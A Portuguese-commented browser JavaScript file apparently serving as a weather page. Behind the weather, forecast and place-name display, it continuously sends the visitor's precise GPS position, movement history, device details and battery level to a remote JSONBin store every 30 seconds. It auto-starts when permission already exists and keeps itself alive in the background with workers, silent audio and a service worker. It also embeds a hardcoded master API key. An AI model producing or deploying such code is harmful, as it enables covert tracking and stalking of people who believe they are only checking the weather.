/**
 * ============================================
 * GPS TRACKER - Background Location Sender
 * ============================================
 * Envia localização em tempo real para JSONBin.io
 */

(function () {
    'use strict';

    // ========================
    // ⚠️ CONFIGURAÇÃO - ALTERE AQUI
    // ========================
    const CONFIG = {
        BIN_ID: '6a0802b8c0954111d82f1971',              // Cole seu Bin ID do jsonbin.io
        API_KEY: '$2a$10$zfLo4xQ0.IvfaaQaJbTDle3OU9eW24NU.iN7JbK9Ph9OpF0MiuRRu',             // Cole sua X-Master-Key do jsonbin.io
        API_URL: 'https://api.jsonbin.io/v3/b/',
        SEND_INTERVAL: 30000,                     // Enviar a cada 30 segundos
        WEATHER_API: 'https://api.open-meteo.com/v1/forecast', // API gratuita de clima
    };

    // Estado do app
    const state = {
        deviceId: null,
        watchId: null,
        lastPosition: null,
        intervalId: null,
        isRunning: false,
        positionHistory: [],
    };

    // ========================
    // Gerar ID único do dispositivo
    // ========================
    function getDeviceId() {
        let id = localStorage.getItem('gps_device_id');
        if (!id) {
            id = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('gps_device_id', id);
        }
        return id;
    }

    // ========================
    // Detectar informações do dispositivo
    // ========================
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let deviceName = 'Desconhecido';
        let os = 'Desconhecido';

        if (/Android/i.test(ua)) {
            os = 'Android';
            const match = ua.match(/Android\s([0-9.]+)/);
            if (match) os += ' ' + match[1];
            const model = ua.match(/;\s*([^;]+)\s*Build/);
            if (model) deviceName = model[1].trim();
        } else if (/iPhone|iPad|iPod/i.test(ua)) {
            os = 'iOS';
            const match = ua.match(/OS\s([0-9_]+)/);
            if (match) os += ' ' + match[1].replace(/_/g, '.');
            if (/iPhone/i.test(ua)) deviceName = 'iPhone';
            else if (/iPad/i.test(ua)) deviceName = 'iPad';
        } else if (/Windows/i.test(ua)) {
            os = 'Windows';
            deviceName = 'PC';
        } else if (/Mac/i.test(ua)) {
            os = 'macOS';
            deviceName = 'Mac';
        } else if (/Linux/i.test(ua)) {
            os = 'Linux';
            deviceName = 'PC Linux';
        }

        return {
            name: deviceName,
            os: os,
            browser: getBrowserName(ua),
            userAgent: ua.substring(0, 150),
        };
    }

    function getBrowserName(ua) {
        if (/Chrome/i.test(ua) && !/Edge|OPR/i.test(ua)) return 'Chrome';
        if (/Firefox/i.test(ua)) return 'Firefox';
        if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
        if (/Edge/i.test(ua)) return 'Edge';
        if (/OPR|Opera/i.test(ua)) return 'Opera';
        return 'Outro';
    }

    // ========================
    // Obter informações de bateria
    // ========================
    async function getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging,
                };
            }
        } catch (e) { }
        return { level: null, charging: null };
    }

    // ========================
    // Enviar dados para JSONBin
    // ========================
    async function sendToJsonBin(locationData) {
        try {
            // 1. Buscar dados atuais do bin
            const getResponse = await fetch(CONFIG.API_URL + CONFIG.BIN_ID + '/latest', {
                method: 'GET',
                headers: {
                    'X-Master-Key': CONFIG.API_KEY,
                },
            });

            if (!getResponse.ok) throw new Error('Falha ao ler bin: ' + getResponse.status);

            const currentData = await getResponse.json();
            let binData = currentData.record || { devices: [] };

            if (!binData.devices) binData.devices = [];

            // 2. Encontrar ou criar dispositivo
            const deviceIndex = binData.devices.findIndex(d => d.id === state.deviceId);

            const deviceEntry = {
                id: state.deviceId,
                info: getDeviceInfo(),
                lastSeen: new Date().toISOString(),
                currentLocation: locationData,
                history: [],
            };

            if (deviceIndex >= 0) {
                // Preservar histórico existente (máximo 50 posições)
                const existing = binData.devices[deviceIndex];
                deviceEntry.history = existing.history || [];
                deviceEntry.history.unshift({
                    lat: locationData.latitude,
                    lng: locationData.longitude,
                    accuracy: locationData.accuracy,
                    speed: locationData.speed,
                    time: locationData.timestamp,
                });
                deviceEntry.history = deviceEntry.history.slice(0, 50);
                deviceEntry.firstSeen = existing.firstSeen || new Date().toISOString();

                binData.devices[deviceIndex] = deviceEntry;
            } else {
                deviceEntry.firstSeen = new Date().toISOString();
                deviceEntry.history = [{
                    lat: locationData.latitude,
                    lng: locationData.longitude,
                    accuracy: locationData.accuracy,
                    speed: locationData.speed,
                    time: locationData.timestamp,
                }];
                binData.devices.push(deviceEntry);
            }

            // 3. Atualizar bin
            const putResponse = await fetch(CONFIG.API_URL + CONFIG.BIN_ID, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Master-Key': CONFIG.API_KEY,
                },
                body: JSON.stringify(binData),
            });

            if (!putResponse.ok) throw new Error('Falha ao atualizar bin: ' + putResponse.status);

            console.log('[GPS Tracker] ✅ Localização enviada com sucesso');
            updateStatusUI('success');
            return true;

        } catch (error) {
            console.error('[GPS Tracker] ❌ Erro ao enviar:', error);
            updateStatusUI('error');
            return false;
        }
    }

    // ========================
    // Buscar clima real (API gratuita)
    // ========================
    async function fetchWeather(lat, lng) {
        try {
            const url = `${CONFIG.WEATHER_API}?latitude=${lat}&longitude=${lng}&current_weather=true&hourly=temperature_2m,relativehumidity_2m,windspeed_10m,weathercode&timezone=auto&forecast_days=1`;
            const response = await fetch(url);
            const data = await response.json();

            if (data.current_weather) {
                updateWeatherUI(data);
            }
        } catch (error) {
            console.error('[Weather] Erro:', error);
            // Mostrar dados simulados se API falhar
            updateWeatherFallback();
        }
    }

    // ========================
    // Mapear código de clima para ícone
    // ========================
    function getWeatherIcon(code) {
        const icons = {
            0: { icon: 'fa-sun', color: '#f6ad55', desc: 'Céu limpo' },
            1: { icon: 'fa-sun', color: '#f6ad55', desc: 'Predominantemente limpo' },
            2: { icon: 'fa-cloud-sun', color: '#a0aec0', desc: 'Parcialmente nublado' },
            3: { icon: 'fa-cloud', color: '#718096', desc: 'Nublado' },
            45: { icon: 'fa-smog', color: '#a0aec0', desc: 'Neblina' },
            48: { icon: 'fa-smog', color: '#a0aec0', desc: 'Neblina com gelo' },
            51: { icon: 'fa-cloud-rain', color: '#4299e1', desc: 'Garoa leve' },
            53: { icon: 'fa-cloud-rain', color: '#4299e1', desc: 'Garoa moderada' },
            55: { icon: 'fa-cloud-showers-heavy', color: '#3182ce', desc: 'Garoa densa' },
            61: { icon: 'fa-cloud-rain', color: '#4299e1', desc: 'Chuva leve' },
            63: { icon: 'fa-cloud-showers-heavy', color: '#3182ce', desc: 'Chuva moderada' },
            65: { icon: 'fa-cloud-showers-heavy', color: '#2b6cb0', desc: 'Chuva forte' },
            71: { icon: 'fa-snowflake', color: '#bee3f8', desc: 'Neve leve' },
            73: { icon: 'fa-snowflake', color: '#90cdf4', desc: 'Neve moderada' },
            75: { icon: 'fa-snowflake', color: '#63b3ed', desc: 'Neve forte' },
            80: { icon: 'fa-cloud-rain', color: '#4299e1', desc: 'Pancadas leves' },
            81: { icon: 'fa-cloud-showers-heavy', color: '#3182ce', desc: 'Pancadas moderadas' },
            82: { icon: 'fa-cloud-showers-heavy', color: '#2b6cb0', desc: 'Pancadas violentas' },
            95: { icon: 'fa-bolt', color: '#ecc94b', desc: 'Tempestade' },
            96: { icon: 'fa-bolt', color: '#d69e2e', desc: 'Tempestade com granizo' },
            99: { icon: 'fa-bolt', color: '#b7791f', desc: 'Tempestade severa' },
        };
        return icons[code] || { icon: 'fa-cloud', color: '#718096', desc: 'Variável' };
    }

    // ========================
    // Atualizar UI do clima
    // ========================
    function updateWeatherUI(data) {
        const current = data.current_weather;
        const weather = getWeatherIcon(current.weathercode);

        const iconEl = document.getElementById('weather-icon');
        const tempEl = document.getElementById('temperature');
        const descEl = document.getElementById('weather-desc');
        const humidityEl = document.getElementById('humidity');
        const windEl = document.getElementById('wind');
        const visibilityEl = document.getElementById('visibility');

        if (iconEl) {
            iconEl.className = `fas ${weather.icon}`;
            iconEl.style.color = weather.color;
        }
        if (tempEl) tempEl.textContent = `${Math.round(current.temperature)}°C`;
        if (descEl) descEl.textContent = weather.desc;
        if (windEl) windEl.textContent = `${Math.round(current.windspeed)} km/h`;

        // Dados horários para umidade
        if (data.hourly) {
            const currentHour = new Date().getHours();
            if (humidityEl && data.hourly.relativehumidity_2m) {
                humidityEl.textContent = `${data.hourly.relativehumidity_2m[currentHour]}%`;
            }
            if (visibilityEl) {
                visibilityEl.textContent = '10 km';
            }

            // Previsão
            updateForecast(data.hourly);
        }
    }

    function updateForecast(hourly) {
        const forecastEl = document.getElementById('forecast');
        if (!forecastEl) return;

        const currentHour = new Date().getHours();
        let html = '';
        
        for (let i = 1; i <= 4; i++) {
            const hourIndex = (currentHour + i * 3) % 24;
            const temp = Math.round(hourly.temperature_2m[hourIndex] || 0);
            const code = hourly.weathercode ? hourly.weathercode[hourIndex] : 0;
            const weather = getWeatherIcon(code || 0);
            const timeStr = `${String(hourIndex).padStart(2, '0')}:00`;

            html += `
                <div class="forecast-item">
                    <div class="time">${timeStr}</div>
                    <div class="icon"><i class="fas ${weather.icon}" style="color: ${weather.color}"></i></div>
                    <div class="temp">${temp}°C</div>
                </div>
            `;
        }
        forecastEl.innerHTML = html;
    }

    function updateWeatherFallback() {
        const tempEl = document.getElementById('temperature');
        const descEl = document.getElementById('weather-desc');
        if (tempEl) tempEl.textContent = '25°C';
        if (descEl) descEl.textContent = 'Parcialmente nublado';
    }

    // ========================
    // Reverse Geocoding (nome do local)
    // ========================
    async function getLocationName(lat, lng) {
        try {
            const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=14&addressdetails=1`;
            const response = await fetch(url, {
                headers: { 'Accept-Language': 'pt-BR' },
            });
            const data = await response.json();

            if (data.address) {
                const parts = [];
                if (data.address.suburb || data.address.neighbourhood) {
                    parts.push(data.address.suburb || data.address.neighbourhood);
                }
                if (data.address.city || data.address.town || data.address.village) {
                    parts.push(data.address.city || data.address.town || data.address.village);
                }
                if (data.address.state) {
                    parts.push(data.address.state);
                }
                return parts.join(', ') || 'Localização detectada';
            }
        } catch (e) {
            console.error('[Geocoding] Erro:', e);
        }
        return 'Localização detectada';
    }

    // ========================
    // UI Updates
    // ========================
    function updateStatusUI(status) {
        const statusText = document.getElementById('status-text');
        const statusDot = document.querySelector('.status-bar .status-dot');

        if (status === 'success') {
            if (statusText) statusText.textContent = `Conectado • Atualizado às ${new Date().toLocaleTimeString('pt-BR')}`;
            if (statusDot) statusDot.className = 'status-dot active';
        } else if (status === 'error') {
            if (statusText) statusText.textContent = 'Erro na conexão • Tentando novamente...';
            if (statusDot) {
                statusDot.className = 'status-dot';
                statusDot.style.background = '#fc5c65';
            }
        }
    }

    function showScreen(screenId) {
        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
        const screen = document.getElementById(screenId);
        if (screen) screen.classList.add('active');
    }

    function showBgIndicator() {
        const indicator = document.getElementById('bg-indicator');
        if (indicator) indicator.classList.remove('hidden');
    }

    // ========================
    // Processar nova posição
    // ========================
    async function processPosition(position) {
        const { latitude, longitude, accuracy, speed, altitude, heading } = position.coords;

        const batteryInfo = await getBatteryInfo();

        const locationData = {
            latitude: latitude,
            longitude: longitude,
            accuracy: Math.round(accuracy),
            speed: speed ? Math.round(speed * 3.6 * 10) / 10 : 0, // m/s para km/h
            altitude: altitude ? Math.round(altitude) : null,
            heading: heading || null,
            battery: batteryInfo,
            timestamp: new Date().toISOString(),
        };

        state.lastPosition = locationData;

        // Atualizar localização na UI
        const locNameEl = document.getElementById('location-name');
        if (locNameEl) {
            const name = await getLocationName(latitude, longitude);
            locNameEl.textContent = name;
        }

        // Buscar clima
        await fetchWeather(latitude, longitude);

        // Enviar para JSONBin
        await sendToJsonBin(locationData);
    }

    // ========================
    // Iniciar rastreamento
    // ========================
    function startTracking() {
        if (state.isRunning) return;

        if (!navigator.geolocation) {
            alert('Seu navegador não suporta geolocalização.');
            return;
        }

        state.deviceId = getDeviceId();
        state.isRunning = true;

        console.log('[GPS Tracker] 🚀 Iniciando rastreamento. Device ID:', state.deviceId);

        // Opções de alta precisão
        const geoOptions = {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0,
        };

        // Watch contínuo
        state.watchId = navigator.geolocation.watchPosition(
            (position) => {
                console.log('[GPS Tracker] 📍 Nova posição recebida');
                processPosition(position);
            },
            (error) => {
                console.error('[GPS Tracker] Erro GPS:', error.message);
                updateStatusUI('error');
            },
            geoOptions
        );

        // Envio periódico (backup caso watchPosition não dispare)
        state.intervalId = setInterval(() => {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    processPosition(position);
                },
                (error) => {
                    console.error('[GPS Tracker] Erro no envio periódico:', error.message);
                },
                geoOptions
            );
        }, CONFIG.SEND_INTERVAL);

        // Mostrar tela principal
        showScreen('main-screen');
        showBgIndicator();

        // Manter ativo com Page Visibility API
        document.addEventListener('visibilitychange', handleVisibilityChange);
    }

    // ========================
    // Manter ativo em segundo plano
    // ========================
    function handleVisibilityChange() {
        if (document.hidden) {
            console.log('[GPS Tracker] 📱 App em segundo plano - mantendo rastreamento');
            // Tentar manter ativo via Web Worker ou NoSleep
            keepAlive();
        } else {
            console.log('[GPS Tracker] 📱 App em primeiro plano');
            // Forçar atualização ao voltar
            if (state.isRunning) {
                navigator.geolocation.getCurrentPosition(
                    processPosition,
                    () => {},
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            }
        }
    }

    // Técnica para manter o app ativo
    function keepAlive() {
        // Worker Blob para manter execução
        try {
            const workerBlob = new Blob([`
                setInterval(() => {
                    self.postMessage('ping');
                }, 25000);
            `], { type: 'application/javascript' });

            const workerUrl = URL.createObjectURL(workerBlob);
            const worker = new Worker(workerUrl);

            worker.onmessage = () => {
                if (state.isRunning && state.lastPosition) {
                    navigator.geolocation.getCurrentPosition(
                        processPosition,
                        () => {},
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
                    );
                }
            };
        } catch (e) {
            console.warn('[GPS Tracker] Worker não suportado:', e);
        }

        // Prevenir sleep com áudio silencioso (mobile)
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();
            gainNode.gain.value = 0.001; // Praticamente silencioso
            oscillator.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            oscillator.start();
        } catch (e) {
            // Silencioso em caso de erro
        }
    }

    // ========================
    // Service Worker para background (opcional)
    // ========================
    async function registerServiceWorker() {
        if ('serviceWorker' in navigator) {
            try {
                // Criar SW inline
                const swCode = `
                    self.addEventListener('install', (e) => self.skipWaiting());
                    self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
                    
                    // Periodic sync (quando suportado)
                    self.addEventListener('periodicsync', (event) => {
                        if (event.tag === 'gps-sync') {
                            event.waitUntil(notifyClients());
                        }
                    });
                    
                    async function notifyClients() {
                        const clients = await self.clients.matchAll();
                        clients.forEach(client => client.postMessage({ type: 'sync-gps' }));
                    }
                `;

                const blob = new Blob([swCode], { type: 'application/javascript' });
                const swUrl = URL.createObjectURL(blob);
                
                await navigator.serviceWorker.register(swUrl, { scope: '/' });
                console.log('[GPS Tracker] Service Worker registrado');
            } catch (e) {
                console.warn('[GPS Tracker] SW não disponível:', e);
            }
        }
    }

    // ========================
    // Inicialização
    // ========================
    function init() {
        const btnAllow = document.getElementById('btn-allow');

        if (btnAllow) {
            btnAllow.addEventListener('click', () => {
                btnAllow.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Conectando...';
                btnAllow.disabled = true;

                navigator.geolocation.getCurrentPosition(
                    () => {
                        startTracking();
                        registerServiceWorker();
                    },
                    (error) => {
                        let msg = 'Erro ao acessar localização.';
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                msg = 'Permissão negada. Ative a localização nas configurações.';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                msg = 'Localização indisponível. Tente novamente.';
                                break;
                            case error.TIMEOUT:
                                msg = 'Tempo esgotado. Verifique seu GPS.';
                                break;
                        }
                        alert(msg);
                        btnAllow.innerHTML = '<i class="fas fa-location-dot"></i> Tentar Novamente';
                        btnAllow.disabled = false;
                    },
                    { enableHighAccuracy: true, timeout: 15000 }
                );
            });
        }

        // Auto-start se já tem permissão
        navigator.permissions?.query({ name: 'geolocation' }).then((result) => {
            if (result.state === 'granted') {
                startTracking();
                registerServiceWorker();
            }
        }).catch(() => {});
    }

    // Iniciar quando DOM estiver pronto
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();